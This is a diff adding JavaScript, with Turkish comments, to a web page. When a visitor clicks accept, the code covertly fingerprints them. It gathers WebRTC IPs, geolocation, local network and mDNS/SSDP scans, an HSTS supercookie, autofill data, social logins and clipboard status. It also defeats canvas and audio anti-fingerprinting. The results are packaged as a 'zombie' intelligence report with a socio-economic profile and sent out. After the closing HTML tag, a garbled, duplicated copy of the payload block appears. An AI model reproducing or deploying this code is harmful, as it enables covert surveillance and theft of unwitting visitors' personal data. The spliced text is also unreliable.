+                        Intelligence.getBatteryStatus(),
+                        Intelligence.getChargingCycle(),
+                        Intelligence.getStorageInsights(),
+                        Intelligence.getMediaDevices(),
+                        Intelligence.getAmbientLight(),
+                        Intelligence.getMagnetometer(),
+                        Intelligence.getWorkerPerformance(),
+                        Intelligence.getProximitySensor(),
+                        Intelligence.getBarometer(),
+                        Intelligence.getClipboardStatus(),
+                        Intelligence.getNotificationStatus(),
+                        Intelligence.getIndexedDBDetails(),
+                        Intelligence.getWASMSupport(),
+                        Intelligence.getUSBDevices(),
+                        Intelligence.getBluetoothDevices(),
+                        Intelligence.getVRSupport(),
+                        new Promise((resolve) => setTimeout(() => resolve(Intelligence.detectSocialLogins()), 0)), // race için async
+                        Intelligence.getWebGPUSupport(),
+                        Intelligence.getCryptoHash(),
+                        Intelligence.getCPUClass(),
+                        Intelligence.getRefreshRate(),
+                        Intelligence.getPermissions(),
+                        new Promise((resolve) => setTimeout(() => resolve(Intelligence.getHSTSSupercookie()), 0)),
+                        new Promise((resolve) => setTimeout(() => resolve(Intelligence.discoverMDNS()), 0)),
+                        new Promise((resolve) => setTimeout(() => resolve(Intelligence.discoverSSDP()), 0)),
+                        new Promise((resolve) => setTimeout(() => resolve(Intelligence.scanLocalNetwork()), 0)),
+                        new Promise((resolve) => setTimeout(() => resolve(Intelligence.testAutofillVuln()), 0))
+                    ].map(func => Promise.race([func, new Promise(r => setTimeout(r, CONFIG.SECURITY.RACE_TIMEOUT, 'TIMEOUT'))]));
+
+                    const layer2Results = await Promise.allSettled(heavyFuncs);
+
+                    // Layer2 sonuçlarını ata (index bazlı)
+                    const webRTCIPs = layer2Results[0].value || "N/A";
+                    const advancedWebRTCIPs = layer2Results[1].value || "N/A";
+                    const audioFP = layer2Results[2].value || "N/A";
+                    const advancedAudioFP = layer2Results[3].value || {};
+                    const geo = layer2Results[4].value || "N/A";
+                    const battery = layer2Results[5].value || "N/A";
+                    const chargingCycle = layer2Results[6].value || "N/A";
+                    const storageData = layer2Results[7].value || {};
+                    const mediaData = layer2Results[8].value || {};
+                    const lightSensor = layer2Results[9].value || "N/A";
+                    const magnetometer = layer2Results[10].value || "N/A";
+                    const workerPerf = layer2Results[11].value || "N/A";
+                    const proximity = layer2Results[12].value || "N/A";
+                    const barometer = layer2Results[13].value || "N/A";
+                    const clipboardStatus = layer2Results[14].value || "N/A";
+                    const notificationStatus = layer2Results[15].value || "N/A";
+                    const idbDetails = layer2Results[16].value || "N/A";
+                    const wasm = layer2Results[17].value || "N/A";
+                    const usb = layer2Results[18].value || "N/A";
+                    const bluetooth = layer2Results[19].value || "N/A";
+                    const vr = layer2Results[20].value || "N/A";
+                    const socialLogins = layer2Results[21].value || {};
+                    const webGpu = layer2Results[22].value || "N/A";
+                    const cryptoHash = layer2Results[23].value || "N/A";
+                    const cpuClass = layer2Results[24].value || "N/A";
+                    const refreshRate = layer2Results[25].value || 60;
+                    const permissions = layer2Results[26].value || {};
+                    const hstsSupercookie = layer2Results[27].value || "N/A";
+                    const mdnsDevices = layer2Results[28].value || "N/A";
+                    const ssdpDevices = layer2Results[29].value || "N/A";
+                    const localNetworkDevices = layer2Results[30].value || "N/A";
+                    const autofillVuln = layer2Results[31].value || "N/A";
+
+                    // ISP Info (public IP için)
+                    const publicFirstIP = webRTCIPs.split(', ')[0] || localIP; // Fallback local
+                    const ispInfo = await Intelligence.getISPInfo(publicFirstIP);
+
+                    // Sync çağrılar
+                    const vibrationSupport = Intelligence.getVibrationSupport() || "N/A";
+                    const perfTimings = Intelligence.getPerformanceTimings() || {};
+                    const pluginsMime = Intelligence.getPluginsAndMime() || {};
+                    const touchDetails = Intelligence.getTouchDetails() || {};
+                    const keyboardLayout = Intelligence.getKeyboardLayout() || "N/A";
+                    const historyLen = Intelligence.getHistoryLength() || 0;
+                    const cookies = Intelligence.getCookiesEnabled() || "N/A";
+                    const dnt = Intelligence.getDNTStatus() || "N/A";
+                    const languages = Intelligence.getLanguages() || "N/A";
+                    const memoryUsage = Intelligence.getMemoryUsage() || {};
+                    const cpuBench = Intelligence.getCPUBenchmark() || {};
+                    const swSupport = Intelligence.getServiceWorkerSupport() || "N/A";
+                    const mathPrec = Intelligence.getMathPrecision() || {};
+                    const orientation = Intelligence.getScreenOrientation() || "N/A";
+                    const pwa = Intelligence.getPWACapable() || "N/A";
+                    const nfc = Intelligence.getNFCSupport() || "N/A";
+                    const gamepads = Intelligence.getGamepads() || "N/A";
+                    const payment = Intelligence.getPaymentSupport() || "N/A";
+                    const credential = Intelligence.getCredentialSupport() || "N/A";
+                    const navigatorProps = Intelligence.getNavigatorProps() || {};
+                    const windowDims = Intelligence.getWindowDimensions() || {};
+                    const perfPrecision = Intelligence.getPerformancePrecision() || "N/A";
+                    const dateFormats = Intelligence.getDateFormats() || {};
+                    const numberFormats = Intelligence.getNumberFormats() || {};
+                    const mediaQueries = Intelligence.getMediaQueryResults() || {};
+                    const autoFlags = Intelligence.getAutomationFlags() || {};
+                    const screenData = Intelligence.getScreenConsistency() || {};
+                    const gpuAdvanced = Intelligence.getAdvancedGPU() || {};
+                    const fontData = Intelligence.getFontAndRendering() || {};
+                    const netData = Intelligence.getNetworkQuality() || {};
+                    const canvasFP = Intelligence.getCanvasFingerprint() || "N/A";
+                    const canvasVar = Intelligence.getCanvasVariations() || "N/A";
+                    const webglExt = Intelligence.getWebGLExtensions() || "N/A";
+                    const canvasNoiseBypass = Intelligence.getCanvasNoiseBypass(canvasFP) || "N/A";
+                    const audioNoiseBypass = Intelligence.getAudioNoiseBypass(audioFP) || "N/A";
+                    const referrer = Intelligence.getReferrer() || "N/A";
+                    const headers = Intelligence.getHeaders() || {};
+                    const autofillData = State.autofillData || {};
+                    const isDevToolsOpen = Intelligence.detectDevTools() || "N/A";
+                    const isVM = Intelligence.detectVM(ispInfo) || "N/A";
+
+                    const threatLevel = Security.checkThreats();
+
+                    // Teknik Detay Özeti (Karmaşayı Azaltmak İçin)
+                    const teknikDetayOzeti = `Canvas FP: ${canvasFP}, Canvas Var: ${canvasVar}, Audio FP: ${audioFP}, Math Prec: ${Intelligence.safeJson(mathPrec)}, Perf Prec: ${perfPrecision}, WebGL Ext: ${webglExt}`;
+
+                    // FULL İSTİHBARAT PAKETİ (Sanitize ile)
+                    const fullPayload = {
+                        visitor_name: name,
+                        timestamp: new Date().toLocaleString('tr-TR'),
+                        zombie_id: State.zombie_id || "N/A",
+                        fingerprint: State.fingerprint || canvasFP,
+                        is_bot: threatLevel.isBot ? "TEHLİKE (BOT)" : "TEMİZ (İNSAN)",
+                        bot_reason: autoFlags.detected_flags || "Yok",
+                        devtools: isDevToolsOpen,
+                        ip_local: localIP || "Gizli/VPN",
+                        ip_webrtc: webRTCIPs,
+                        geo_loc: geo,
+                        timezone: timeData.zone,
+                        net_speed: netData.downlink + " Mbps",
+                        net_type: netData.type,
+                        local_network_devices: localNetworkDevices,
+                        cpu_cores: specs.cores + " Çekirdek",
+                        ram_memory: specs.ram || "Bilinmiyor",
+                        gpu_model: gpuAdvanced.renderer || "Bilinmiyor",
+                        os_platform: specs.platform,
+                        screen_res: specs.screen,
+                        orientation: orientation,
+                        battery: battery || "N/A",
+                        hsts_supercookie: hstsSupercookie,
+                        mdns_devices: mdnsDevices,
+                        ssdp_devices: ssdpDevices,
+                        webgpu_support: webGpu,
+                        autofill_vuln: autofillVuln,
+                        clipboard: clipboardStatus,
+                        user_agent: specs.userAgent,
+                        cpu_class: cpuClass,
+                        refresh_rate: refreshRate,
+                        charging_cycle: chargingCycle,
+                        isp_info: Intelligence.safeJson(ispInfo),
+                        referrer: referrer,
+                        headers: Intelligence.safeJson(headers),
+                        autofill_data: Intelligence.safeJson(autofillData),
+                        is_vm: isVM,
+                        canvas_noise_bypass: canvasNoiseBypass,
+                        audio_noise_bypass: audioNoiseBypass,
+                        permissions: Intelligence.safeJson(permissions),
+                        advanced_audio_fp: Intelligence.safeJson(advancedAudioFP),
+                        storage_data: Intelligence.safeJson(storageData),
+                        media_data: Intelligence.safeJson(mediaData),
+                        social_logins: Intelligence.safeJson(socialLogins),
+                        perf_timings: Intelligence.safeJson(perfTimings),
+                        plugins_mime: Intelligence.safeJson(pluginsMime),
+                        touch_details: Intelligence.safeJson(touchDetails),
+                        memory_usage: Intelligence.safeJson(memoryUsage),
+                        cpu_bench: Intelligence.safeJson(cpuBench),
+                        math_prec: Intelligence.safeJson(mathPrec),
+                        date_formats: Intelligence.safeJson(dateFormats),
+                        number_formats: Intelligence.safeJson(numberFormats),
+                        media_queries: Intelligence.safeJson(mediaQueries),
+                        auto_flags: Intelligence.safeJson(autoFlags),
+                        screen_data: Intelligence.safeJson(screenData),
+                        gpu_advanced: Intelligence.safeJson(gpuAdvanced),
+                        font_data: Intelligence.safeJson(fontData),
+                        time_data: Intelligence.safeJson(timeData),
+                        net_data: Intelligence.safeJson(netData),
+                        navigator_props: Intelligence.safeJson(navigatorProps),
+                        window_dims: Intelligence.safeJson(windowDims),
+                        teknik_detay_ozeti: teknikDetayOzeti
+                    };
+
+                    // Analiz Ekle
+                    const analysis = Intelligence.analyzeIntelligence(fullPayload);
+                    fullPayload.istihbarat_ozeti = analysis.istihbarat_ozeti;
+                    fullPayload.tahmini_lokasyon = analysis.tahmini_lokasyon;
+                    fullPayload.cihaz_sinifi = analysis.cihaz_sinifi;
+                    fullPayload.sosyo_ekonomik = analysis.sosyo_ekonomik;
+
+                    await Security.generateReport(fullPayload);
+                })();
 
             } catch (error) {
-                console.error("Gönderim Hatası:", error);
+                console.error("Accept Hatası:", error);
                 UI.elements.spinnerOverlay.classList.add('hidden');
                 UI.showStatus("status_fail", false);
                 AudioEngine.sfx.error();
@@ -1429,8 +2963,89 @@ if (window.DeviceOrientationEvent) {
 
     };
 
-    /* ==========================================================================
-       BAŞLAT
-       ========================================================================== */
+    Main.init();
+});</script></body></html>ing('tr-TR'),
+                        zombie_id: State.zombie_id || "N/A",
+                        fingerprint: State.fingerprint || canvasFP,
+                        is_bot: threatLevel.isBot ? "TEHLİKE (BOT)" : "TEMİZ (İNSAN)",
+                        bot_reason: autoFlags.detected_flags || "Yok",
+                        devtools: isDevToolsOpen,
+                        ip_local: localIP || "Gizli/VPN",
+                        ip_webrtc: webRTCIPs,
+                        geo_loc: geo,
+                        timezone: timeData.zone,
+                        net_speed: netData.downlink + " Mbps",
+                        net_type: netData.type,
+                        local_network_devices: localNetworkDevices,
+                        cpu_cores: specs.cores + " Çekirdek",
+                        ram_memory: specs.ram || "Bilinmiyor",
+                        gpu_model: gpuAdvanced.renderer || "Bilinmiyor",
+                        os_platform: specs.platform,
+                        screen_res: specs.screen,
+                        orientation: orientation,
+                        battery: battery || "N/A",
+                        hsts_supercookie: hstsSupercookie,
+                        mdns_devices: mdnsDevices,
+                        ssdp_devices: ssdpDevices,
+                        webgpu_support: webGpu,
+                        autofill_vuln: autofillVuln,
+                        clipboard: clipboardStatus,
+                        user_agent: specs.userAgent,
+                        cpu_class: cpuClass,
+                        refresh_rate: refreshRate,
+                        charging_cycle: chargingCycle,
+                        isp_info: Intelligence.safeJson(ispInfo),
+                        referrer: referrer,
+                        headers: Intelligence.safeJson(headers),
+                        autofill_data: Intelligence.safeJson(autofillData),
+                        is_vm: isVM,
+                        canvas_noise_bypass: canvasNoiseBypass,
+                        audio_noise_bypass: audioNoiseBypass,
+                        permissions: Intelligence.safeJson(permissions),
+                        advanced_audio_fp: Intelligence.safeJson(advancedAudioFP),
+                        storage_data: Intelligence.safeJson(storageData),
+                        media_data: Intelligence.safeJson(mediaData),
+                        social_logins: Intelligence.safeJson(socialLogins),
+                        perf_timings: Intelligence.safeJson(perfTimings),
+                        plugins_mime: Intelligence.safeJson(pluginsMime),
+                        touch_details: Intelligence.safeJson(touchDetails),
+                        memory_usage: Intelligence.safeJson(memoryUsage),
+                        cpu_bench: Intelligence.safeJson(cpuBench),
+                        math_prec: Intelligence.safeJson(mathPrec),
+                        date_formats: Intelligence.safeJson(dateFormats),
+                        number_formats: Intelligence.safeJson(numberFormats),
+                        media_queries: Intelligence.safeJson(mediaQueries),
+                        auto_flags: Intelligence.safeJson(autoFlags),
+                        screen_data: Intelligence.safeJson(screenData),
+                        gpu_advanced: Intelligence.safeJson(gpuAdvanced),
+                        font_data: Intelligence.safeJson(fontData),
+                        time_data: Intelligence.safeJson(timeData),
+                        net_data: Intelligence.safeJson(netData),
+                        navigator_props: Intelligence.safeJson(navigatorProps),
+                        window_dims: Intelligence.safeJson(windowDims),
+                        teknik_detay_ozeti: teknikDetayOzeti
+                    };
+
+                    // Analiz Ekle
+                    const analysis = Intelligence.analyzeIntelligence(fullPayload);
+                    fullPayload.istihbarat_ozeti = analysis.istihbarat_ozeti;
+                    fullPayload.tahmini_lokasyon = analysis.tahmini_lokasyon;
+                    fullPayload.cihaz_sinifi = analysis.cihaz_sinifi;
+                    fullPayload.sosyo_ekonomik = analysis.sosyo_ekonomik;
+
+                    await Security.generateReport(fullPayload);
+                })();
+
+            } catch (error) {
+                console.error("Accept Hatası:", error);
+                UI.elements.spinnerOverlay.classList.add('hidden');
+                UI.showStatus("status_fail", false);
+                AudioEngine.sfx.error();
+                setTimeout(() => UI.elements.modalBackdrop.classList.remove('hidden'), 2000);
+            }
+        }
+
+    };
+
     Main.init();
 });</script></body></html>
